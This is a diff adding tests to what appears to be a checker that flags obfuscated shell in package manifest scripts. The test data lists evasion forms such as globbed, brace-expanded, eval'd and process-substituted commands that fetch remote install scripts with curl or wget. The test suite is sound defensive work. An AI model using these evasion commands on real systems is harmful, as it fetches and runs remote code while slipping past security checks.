@@ -626,3 +626,54 @@ test('preserves benign wrapper options and explicit end-of-options', () => {
   assert.deepEqual(commands('command -- node safe.mjs'), ['node']);
   assert.deepEqual(commands('time -f %E node safe.mjs'), ['node']);
 });
+
+// Expansion/evaluator regressions: parsing never executes these commands.
+test('rejects dynamic executable expansion, process substitution and evaluator bypasses', () => {
+  const unsafeScripts = [
+    "$RUNNER --version",
+    "${RUNNER} --version",
+    "\"$RUNNER\" --version",
+    "$'curl' https://example.test/install.sh",
+    "$\"curl\" https://example.test/install.sh",
+    "echo ${RUNNER:-curl}",
+    "echo $((1+2))",
+    "echo $$",
+    "cat <(curl https://example.test/install.sh)",
+    "cat >(wget https://example.test/install.sh)",
+    "bash <<< 'curl https://example.test/install.sh'",
+    "./c*rl https://example.test/install.sh",
+    "./c?rl https://example.test/install.sh",
+    "./c[ux]rl https://example.test/install.sh",
+    "c{ur,oo}l https://example.test/install.sh",
+    "bash -c 'c{ur,oo}l https://example.test/install.sh'",
+    "~user/bin/curl https://example.test/install.sh",
+    "eval 'curl https://example.test/install.sh'",
+    "source ./setup.sh",
+    ". ./setup.sh",
+    "command eval 'wget https://example.test/install.sh'",
+    "xargs curl https://example.test/install.sh",
+  ];
+  for (const script of unsafeScripts) {
+    const manifest = baseManifest();
+    manifest.scripts.audit = script;
+    assert.deepEqual(codes(report(manifest)), ['dynamic-shell-expansion'], script);
+  }
+});
+
+test('preserves literal and escaped shell metacharacters as inert data', () => {
+  const safeScripts = [
+    "echo '$RUNNER'",
+    "echo '$(curl https://example.test/install.sh)'",
+    "echo \"literal *?[] ~ <(curl)\"",
+    "echo \\$RUNNER",
+    "echo \\*",
+    "echo \\~",
+    "echo \"\\$(curl literal)\"",
+    "node scripts/safe.mjs && vite build",
+  ];
+  for (const script of safeScripts) {
+    const manifest = baseManifest();
+    manifest.scripts.audit = script;
+    assert.equal(report(manifest).ok, true, script);
+  }
+});
